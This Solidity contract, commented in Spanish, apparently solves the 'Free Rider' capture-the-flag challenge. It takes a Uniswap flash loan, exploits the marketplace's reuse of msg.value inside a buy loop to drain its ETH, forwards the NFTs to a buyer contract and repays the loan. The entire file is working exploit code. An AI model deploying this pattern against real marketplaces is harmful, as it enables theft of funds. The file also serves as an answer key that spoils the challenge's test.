// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol';
import "hardhat/console.sol";

interface INFTMarketplace {
  function buyMany(uint256[] calldata tokenIds) external payable;
  function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices) external;
  function token() external returns (IERC721);
}

interface IUniswapV2Pair {
  function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IWETH {
  function deposit() external payable;
  function withdraw(uint wad) external;
  function transfer(address dst, uint wad) external returns (bool);
}

interface IERC721Receiver {
  function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4);
}

interface IERC721 {
    function setApprovalForAll(address operator, bool approved) external;
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}


contract FreeRiderAttacker is Ownable, IUniswapV2Callee, IERC721Receiver{
  INFTMarketplace _nftMarketplace;
  address payable _buyerContract;
  IUniswapV2Pair _uniswapPair;
  IWETH immutable _weth;
  IERC721 immutable _nft;

  uint private totalFlashLoan;

  constructor(INFTMarketplace nftMarketplace, address payable buyerContract, IUniswapV2Pair uniswapPair, IWETH weth ){
    _nftMarketplace = nftMarketplace;
    _buyerContract = buyerContract;
    _uniswapPair = uniswapPair;
    _weth = weth;
    _nft = nftMarketplace.token();
  }


  function attack() external onlyOwner {
    //Tomar flashloan en uniswapPair por el balance total del marketPlace + 30 ETH para comprar 2 NFTs.
    totalFlashLoan = address(_nftMarketplace).balance + 30 ether;
    console.log("EL FLASHLOAN TOTAL ES DE: ", totalFlashLoan);
    _uniswapPair.swap(totalFlashLoan, 0, address(this), "holis"); //token0 es WETH. token1 es DVT. String "holis" es para que el pair Uniswap invoque a la función uniswapV2Call en nuestro contrato atacante.
  }

  function uniswapV2Call(address , uint, uint, bytes calldata) external override {
    console.log("DENTRO DE UNISWAPV2 CALL");
    //El flashloan en WETH lo convierto a ETH para poder comprar los NFT.
    _weth.withdraw(totalFlashLoan);
    
    //Comprar 2 NFT a 15 ETH en buena ley. Tras la compra el marketplace queda con 90 ETH. Se compran 2 para aprovechar a futuro la vulnerabilidad del msg.value dentro de un loop.
    uint256[] memory nftsIds = new uint256[](2);
    nftsIds[0] = 0; 
    nftsIds[1] = 1;
    _nftMarketplace.buyMany{value:30 ether}(nftsIds); //30 ether ya que cada uno cuesta 15.

    //Primero damos approve para que mis nfts los pueda manejar el marketplace. Luego ponemos a la venta ambos NFT al precio del balance total ETH del marketplace. En este caso 90 ETH.
    _nft.setApprovalForAll(address(_nftMarketplace), true);
    uint256[] memory nftsPrices = new uint256[](2);
    uint256 marketPlaceBalance = address(_nftMarketplace).balance;
    console.log("EL BALANCE DEL MARKETPLACE ES DE: ", marketPlaceBalance);
    nftsPrices[0] = marketPlaceBalance; 
    nftsPrices[1] = marketPlaceBalance;
    _nftMarketplace.offerMany(nftsIds, nftsPrices);

    //Usar msg.value con valor 90 ETH para comprar dos NFT mediante el método "buyMany". De esta forma se vacía la cuenta del contrato marketplace.
    _nftMarketplace.buyMany{value: marketPlaceBalance}(nftsIds);

    //Compramos los 4 NFT restantes en buena ley. Nos quedarían 120 ETH (para devolver el flashloan a Uniswap).
    uint256[] memory nftsRestantesIds = new uint256[](4);
    nftsRestantesIds[0] = 2; 
    nftsRestantesIds[1] = 3;
    nftsRestantesIds[2] = 4;
    nftsRestantesIds[3] = 5;
    _nftMarketplace.buyMany{value:60 ether}(nftsRestantesIds); //60 ether ya que cada uno cuesta 15.

    //Enviamos los 6 NFT al contrato buyer. Como la transacción originalmente la iniciamos desde la cuenta attacker (partner en FreeRiderBuyer.sol), los require se cumplirán.
    for (uint256 id = 0; id < 6; id++) {
      _nft.safeTransferFrom(address(this), _buyerContract,id);
    }

    //Calculamos el fee. Recordemos que feeTo fue seteado a zeroAddress (si no el fee sería mayor). Ver imágenes anexadas en la carpeta educational de este challenge.
    //Fórmula del fee: loQueRetiramos * ( [1/(1-0.003)] - 1 ).
    uint256 fee = ((120 ether * 3) / uint256(997)) +1; 
    console.log("EL FEE ES DE: ", fee);

    //Devolvemos los 120 WETH del flashloan a Uniswap + el fee necesario.
    _weth.deposit{value: totalFlashLoan + fee}(); //Devuelvo los ETH que tomé.
    _weth.transfer(address(_uniswapPair),totalFlashLoan + fee); //Le transfiero los WETH del flashloan a Uniswap.
  }

  // onERC721Received en realidad no aporta nada, simplemente lo implementamos porque lo invoca el contrato de los NFT al hacernos un safeTransferFrom. En caso de no devolver el selector, la transferencia sería revertida y no es lo que queremos. Simplemente copiamos la misma estructura que aparece en FreeRiderBuyer, pero sin la lógica de requires.
  function onERC721Received(address, address, uint256, bytes memory) pure external override returns (bytes4){
    return IERC721Receiver.onERC721Received.selector;
  }
  receive() external payable{}
}